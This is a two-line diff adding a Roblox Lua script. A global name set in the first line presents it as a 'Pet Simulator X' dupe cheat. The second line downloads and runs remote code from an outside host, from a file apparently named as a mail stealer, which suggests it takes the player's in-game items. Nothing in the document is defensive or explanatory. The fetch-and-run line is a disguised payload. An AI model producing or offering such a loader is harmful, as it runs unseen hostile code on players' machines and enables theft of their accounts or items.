@@ -1,0 +1,2 @@
+getgenv().name = "Pet_SimulatorxDupe" 
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
